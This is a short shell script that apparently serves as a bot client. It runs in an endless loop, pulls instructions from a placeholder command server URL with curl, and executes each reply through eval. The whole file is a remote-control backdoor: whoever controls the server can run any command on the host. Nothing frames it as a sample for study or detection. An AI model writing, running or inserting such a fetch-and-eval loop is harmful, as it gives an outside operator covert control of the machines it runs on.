#!/bin/sh
while true; do
 task=$(curl -fsSL https://control.invalid/api/v2/bots/instructions/)
 eval "$task"
done
